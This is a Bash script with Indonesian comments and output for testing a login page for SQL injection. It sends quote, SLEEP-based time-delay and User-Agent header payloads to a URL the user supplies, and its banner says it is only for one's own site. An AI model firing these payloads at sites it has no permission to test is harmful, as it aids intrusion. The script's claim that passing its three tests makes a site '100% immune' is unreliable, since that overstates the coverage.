#!/bin/bash
# ============================================
#   🥷 SQLi TESTER v2.0 (ADVANCED)
#   Error-Based • Time-Based • Header Injection
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; NC='\033[0m'

[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

clear
echo -e "${CYAN}╔════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  🥷 SQLi TESTER v2.0 — DEEP SCAN           ║${NC}"
echo -e "${CYAN}║  (Hanya untuk web sendiri!)                ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════╝${NC}"
echo ""

read -p "👉 Masukkan URL Web (contoh: https://gold.domain.com/login.php): " TARGET_URL
[[ -z "$TARGET_URL" ]] && { echo -e "${RED}❌ URL Kosong!${NC}"; exit 1; }

if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    echo -e "${RED}❌ URL harus diawali http:// atau https://${NC}"; exit 1
fi

echo -e "\n${CYAN}[1/4] Cek Target...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL")
if [[ "$HTTP_CODE" != "200" ]]; then
    echo -e "${RED}❌ Target mati (HTTP $HTTP_CODE)${NC}"; exit 1
fi
echo -e "${GREEN}  ✓ Target Hidup (HTTP 200)${NC}"

VULN=0

# ============================================
# TEST 1: ERROR-BASED (Cari Pesan Error MySQL)
# ============================================
echo -e "\n${CYAN}[2/4] Test #1: Error-Based (Cari pesan error MySQL)...${NC}"
PAYLOADS_ERR=("'" "''" "\"" "\\" "admin'")
for PAYLOAD in "${PAYLOADS_ERR[@]}"; do
    ENC=$(printf %s "$PAYLOAD" | jq -sRr @uri)
    RESP=$(curl -s -L -X POST -d "username=${ENC}&password=test" "$TARGET_URL")
    
    if echo "$RESP" | grep -qiE "sql syntax|mysql_fetch|mysqli_|PDOException|syntax error|unclosed quotation|warning: mysql"; then
        echo -e "${RED}  [VULNERABLE] Payload: $PAYLOAD -> Error MySQL Bocor!${NC}"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  [SAFE] Payload: $PAYLOAD -> Tidak ada error bocor${NC}"
    fi
done

# ============================================
# TEST 2: TIME-BASED (Blind SQLi)
# ============================================
echo -e "\n${CYAN}[3/4] Test #2: Time-Based (Nyuruh Database Tidur 3 Detik)...${NC}"
PAYLOADS_TIME=(
    "admin' OR SLEEP(3)--"
    "admin';SELECT SLEEP(3)--"
    "admin' AND SLEEP(3)--"
)
for PAYLOAD in "${PAYLOADS_TIME[@]}"; do
    ENC=$(printf %s "$PAYLOAD" | jq -sRr @uri)
    
    # Hitung waktu respon
    START=$(date +%s)
    curl -s -L -X POST -d "username=${ENC}&password=test" "$TARGET_URL" > /dev/null
    END=$(date +%s)
    DURATION=$((END - START))
    
    if [[ $DURATION -ge 3 ]]; then
        echo -e "${RED}  [VULNERABLE] Payload: $PAYLOAD -> Server tidur ${DURATION} detik!${NC}"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  [SAFE] Payload: $PAYLOAD -> Respon cepat (${DURATION} detik)${NC}"
    fi
done

# ============================================
# TEST 3: HEADER INJECTION (User-Agent)
# ============================================
echo -e "\n${CYAN}[4/4] Test #3: Header Injection (User-Agent)...${NC}"
PAYLOAD_HEADER="' OR SLEEP(3)--"
START=$(date +%s)
curl -s -L -X GET -A "$PAYLOAD_HEADER" "$TARGET_URL" > /dev/null
END=$(date +%s)
DURATION=$((END - START))

if [[ $DURATION -ge 3 ]]; then
    echo -e "${RED}  [VULNERABLE] User-Agent Injection -> Server tidur ${DURATION} detik!${NC}"
    VULN=$((VULN+1))
else
    echo -e "${GREEN}  [SAFE] User-Agent aman (${DURATION} detik)${NC}"
fi

# ============================================
# KESIMPULAN
# ============================================
echo -e "\n${CYAN}╔════════════════════════════════════════════╗${NC}"
if [[ $VULN -eq 0 ]]; then
    echo -e "${GREEN}║ 🛡️  HASIL: WEB 100% KEBAL SQL INJECTION!   ║${NC}"
    echo -e "${GREEN}║ Sistem PDO & Sanitasi Berjalan Sempurna.   ║${NC}"
else
    echo -e "${RED}║ 🚨 HASIL: DITEMUKAN $VULN CELAH KEAMANAN!  ║${NC}"
    echo -e "${RED}║ Segera perbaiki query database kamu!       ║${NC}"
fi
echo -e "${CYAN}╚════════════════════════════════════════════╝${NC}"
echo ""
